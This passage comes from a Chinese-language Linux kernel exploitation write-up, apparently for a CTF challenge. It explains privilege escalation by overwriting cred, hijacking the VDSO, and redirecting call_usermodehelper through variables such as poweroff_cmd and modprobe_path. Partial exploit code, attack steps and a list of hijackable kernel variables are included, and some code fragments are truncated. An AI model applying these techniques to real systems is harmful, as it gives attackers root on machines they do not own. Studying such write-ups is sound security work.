                    break;
                }
            }
        }
        if (result==0)
        {
            puts("[-] not found, try again! \n");
            exit(-1);
        }
        // 修改cred
        memset((char *)root_cred,0,28);
        write_mem(fd,cred,root_cred,28);
成功提权：
* * *
### 2\. 方法二：劫持VDSO
VDSO是内核通过映射方法与用户态共享一块物理内存，从而加快执行效率，也叫影子内存。当在内核态修改内存时，用户态所访问到的数据同样会改变，这样的数据区在用户态有两块，`vdso`和`vsyscall`。
    gdb-peda$ cat /proc/self/maps
    00400000-0040c000 r-xp 00000000 08:01 561868                             /bin/cat
    0060b000-0060c000 r--p 0000b000 08:01 561868                             /bin/cat
    0060c000-0060d000 rw-p 0000c000 08:01 561868                             /bin/cat
    01cff000-01d20000 rw-p 00000000 00:00 0                                  [heap]
    ...
    7fff937d7000-7fff937d9000 r-xp 00000000 00:00 0                          [vdso]
    ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
##### （1）VDSO介绍
vsyscall和VDSO都是为了避免传统系统调用模式INT
0x80/SYSCALL造成的内核空间和用户空间的上下文切换。vsyscall只允许4个系统调用，且在每个进程中静态分配了相同的地址；VDSO是动态分配的，地址随机，可提供超过4个系统调用，VDSO是glibc库提供的功能。
VDSO—Virtual Dynamic Shared
Object。本质就是映射到内存中的.so文件，对应的程序可以当普通的.so来使用其中的函数。VDSO所在的页，在内核态是可读、可写的，在用户态是可读、可执行的。
VDSO在每个程序启动的加载过程如下：
    #0  remap_pfn_range (vma=0xffff880000bba780, addr=140731259371520, pfn=8054, size=4096, prot=...) at mm/memory.c:1737
    #1  0xffffffff810041ce in map_vdso (image=0xffffffff81a012c0 , calculate_addr=) at arch/x86/entry/vdso/vma.c:151
    #2  0xffffffff81004267 in arch_setup_additional_pages (bprm=, uses_interp=) at arch/x86/entry/vdso/vma.c:209
    #3  0xffffffff81268b74 in load_elf_binary (bprm=0xffff88000f86cf00) at fs/binfmt_elf.c:1080
    #4  0xffffffff812136de in search_binary_handler (bprm=0xffff88000f86cf00) at fs/exec.c:1469
在map_vdso中首先查找到一块用户态地址，将该块地址设置为VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC，利用remap_pfn_range将内核页映射过去。
dump vdso代码：
    //dump_vdos.c
    // 获取gettimeofday 字符串的偏移，便于爆破；dump vdso还是需要在程序中爆破VDSO地址，然后gdb中断下，$dump memory即可（VDSO地址是从ffffffff开头的）。
    #include 
    #include 
    #include 
    #include 
    #include  
     #include 
    int main(){
        int test;
        size_t result=0;
        unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);
        result=memmem(sysinfo_ehdr,0x1000,"gettimeofday",12);
        printf("[+]VDSO : %p\n",sysinfo_ehdr);
        printf("[+]The offset of gettimeofday is : %x\n",result-sysinfo_ehdr);
        scanf("Wait! %d", test);  
        /* 
        gdb break point at 0x400A36
        and then dump memory
        why only dump 0x1000 ???
        */
        if (sysinfo_ehdr!=0){
            for (int i=0;i
    int main(){
        while(1){
            puts("111");
            sleep(1);
            gettimeofday();
        }
    }
完整exp见`exp_VDSO.c`。
### 3\. 方法三：利用`call_usermodehelper()`
##### （1）call_usermodehelper()原理
最初原理可见[New Reliable Android Kernel Root Exploitation
Techniques](http://powerofcommunity.net/poc2016/x82.pdf)。
prctl的原理已在[绕过内核SMEP姿势总结与实践](https://www.jianshu.com/p/3d707fac499a)中分析过，就不再赘述。
由于prctl第一个参数是int类型，在64位系统中被截断，所以不能正确传参。
`call_usermodehelper`（\kernel\kmod.c
603），这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令（注意命令中的参数要用全路径，不能用相对路径）。但其中提到在安卓利用时需要关闭SEAndroid。
我们要劫持`task_prctl`到`call_usermoderhelper`吗，不是的，因为这里的第一个参数也是`64位`的，也不能直接劫持过来。但是内核中有些代码片段是调用了`Call_usermoderhelper`的，可以转化为我们所用（通过它们来执行用户代码或访问用户数据，绕过SMEP）。
也就是有些函数从内核调用了用户空间，例如`kernel/reboot.c`中的`__orderly_poweroff`函数中调用了`run_cmd`参数是`poweroff_cmd`,而且`poweroff_cmd`是一个全局变量，可以修改后指向我们的命令。
    static int __orderly_poweroff(bool force)
    {
        int ret;
        ret = run_cmd(poweroff_cmd);
        if (ret && force) {
            pr_warn("Failed to start orderly shutdown: forcing the issue\n");
            /*
             * I guess this should try to kick off some daemon to sync and
             * poweroff asap.  Or not even bother syncing if we're doing an
             * emergency shutdown?
             */
            emergency_sync();
            kernel_power_off();
        }
        return ret;
    }
    static void poweroff_work_func(struct work_struct *work)
    {
        __orderly_poweroff(poweroff_force);
    }
##### （2）利用步骤
完整利用代码见`exp_run_cmd.c`。
  1. 利用kremalloc的问题，达到任意地址读写的能力
  2. 通过快速爆破，泄露出VDSO地址。
  3. 利用VDSO和kernel_base相差不远的特性，泄露出内核基址。（泄露VDSO是为了泄露内核基址？）
  4. 篡改prctl的hook为selinux_disable函数的地址
  5. 调用prctl使得selinux失效（INetCop Security给出的思路中要求的一步）
  6. 篡改poweroff_cmd使其等于我们预期执行的命令（"/bin/chmod 777 /flag\0"）。或者将poweroff_cmd处改为一个反弹shell的binary命令，监听端口就可以拿到shell。
  7. 篡改prctl的hook为orderly_poweroff
  8. 调用prctl执行我们预期的命令，达到内核提权的效果。
其中第4、5步是安卓root必须的两步，本题linux环境下不需要。
利用成功截图如下：
##### （3）总结可劫持的变量
不需要劫持函数虚表，不需要传参数那么麻烦，只需要修改变量即可提权。
1.modprobe_path
    // /kernel/kmod.c
    char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";
    // /kernel/kmod.c
    static int call_modprobe(char *module_name, int wait) 
        argv[0] = modprobe_path;
        info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
                         NULL, free_modprobe_argv, NULL);
        return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
    // /kernel/kmod.c
    int __request_module(bool wait, const char *fmt, ...)
        ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);
__request_module - try to load a kernel module
触发：可通过执行错误格式的elf文件来触发执行modprobe_path指定的文件。
2.poweroff_cmd
    // /kernel/reboot.c
    char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";
    // /kernel/reboot.c
    static int run_cmd(const char *cmd)
        argv = argv_split(GFP_KERNEL, cmd, NULL);
        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    // /kernel/reboot.c
    static int __orderly_poweroff(bool force)    
        ret = run_cmd(poweroff_cmd);
触发：执行__orderly_poweroff()即可。
3.uevent_helper
    // /lib/kobject_uevent.c
    #ifdef CONFIG_UEVENT_HELPER
    char uevent_helper[UEVENT_HELPER_PATH_LEN] = CONFIG_UEVENT_HELPER_PATH;
    // /lib/kobject_uevent.c
    static int init_uevent_argv(struct kobj_uevent_env *env, const char *subsystem)
    {  ......
        env->argv[0] = uevent_helper; 
      ...... }
    // /lib/kobject_uevent.c
    int kobject_uevent_env(struct kobject *kobj, enum kobject_action action,
                   char *envp_ext[])
    {......
        retval = init_uevent_argv(env, subsystem);
        info = call_usermodehelper_setup(env->argv[0], env->argv,
                             env->envp, GFP_KERNEL,
                             NULL, cleanup_uevent_env, env);
    ......}
4.ocfs2_hb_ctl_path
    // /fs/ocfs2/stackglue.c
    static char ocfs2_hb_ctl_path[OCFS2_MAX_HB_CTL_PATH] = "/sbin/ocfs2_hb_ctl";
    // /fs/ocfs2/stackglue.c
    static void ocfs2_leave_group(const char *group)
        argv[0] = ocfs2_hb_ctl_path;
        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
5.nfs_cache_getent_prog
    // /fs/nfs/cache_lib.c
    static char nfs_cache_getent_prog[NFS_CACHE_UPCALL_PATHLEN] =
                    "/sbin/nfs_cache_getent";
    // /fs/nfs/cache_lib.c
    int nfs_cache_upcall(struct cache_detail *cd, char *entry_name)
        char *argv[] = {
            nfs_cache_getent_prog,
            cd->name,
            entry_name,
            NULL
        };
        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
6.cltrack_prog
    // /fs/nfsd/nfs4recover.c
    static char cltrack_prog[PATH_MAX] = "/sbin/nfsdcltrack";
    // /fs/nfsd/nfs4recover.c
    static int nfsd4_umh_cltrack_upcall(char *cmd, char *arg, char *env0, char *env1)
        argv[0] = (char *)cltrack_prog;
        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
### 4\. 方法四： 劫持tty_struct
找不到`mov rsp,rax`、`mov rsp,[rbx+xx]`这样的gadget，有点尴尬。
具体方法还是参考[call_usermodehelper提权路径变量总结](https://www.jianshu.com/p/a2259cd3e79e)，其中总结了如何劫持tty_struct中的write和ioctl两种方法。
### 参考：